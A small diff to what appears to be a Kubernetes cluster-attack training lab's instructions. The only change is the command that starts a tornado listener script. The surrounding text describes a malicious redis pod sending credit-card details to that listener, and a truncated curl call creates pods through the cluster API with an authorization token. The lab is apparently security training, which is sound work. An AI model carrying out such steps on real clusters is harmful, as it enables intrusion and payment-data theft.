@@ -331,7 +331,7 @@ curl -s https://10.96.0.1/api/v1/namespaces/default/pods -XPOST -H "Authorizatio
 ```bash
 cd /home/we45/container-training/Kubernetes/VM/K8s-Cluster-Attack
 
-./tornado_server.py
+python3 tornado_server.py
 ```
 
 You should now see all the credit-card details being posted to the tornado lister from the malicious redis pod
